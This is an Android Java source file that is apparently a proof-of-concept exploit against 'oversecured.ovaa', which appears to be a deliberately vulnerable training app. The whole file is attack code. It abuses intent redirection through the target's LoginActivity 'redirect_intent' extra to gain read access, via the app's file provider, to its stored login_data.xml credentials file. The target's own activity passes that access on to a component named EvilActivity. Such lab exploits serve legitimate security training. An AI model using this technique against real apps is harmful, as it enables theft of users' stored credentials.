package com.example.filecontent;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent extra = new Intent();
        extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        extra.setClassName(getPackageName(), "com.example.filecontent.EvilActivity");
        extra.setData(Uri.parse("content://oversecured.ovaa.fileprovider/root/data/data/oversecured.ovaa/shared_prefs/login_data.xml"));

        Intent intent = new Intent();
        intent.setClassName("oversecured.ovaa", "oversecured.ovaa.activities.LoginActivity");
        intent.putExtra("redirect_intent", extra);
        startActivity(intent);

    }
}